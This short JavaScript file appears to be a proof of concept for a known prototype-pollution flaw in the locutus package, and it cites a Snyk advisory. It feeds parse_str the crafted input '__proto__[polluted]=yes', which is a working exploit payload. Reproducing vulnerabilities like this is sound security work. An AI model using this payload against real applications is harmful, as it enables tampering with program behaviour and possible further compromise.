//https://snyk.io/vuln/SNYK-JS-LOCUTUS-598675
 
  try {
    polluted;
     
  } catch (e) {
     
  }

  const locutus = require("locutus");
  locutus.php.strings.parse_str("__proto__[polluted]=yes");
// End of file
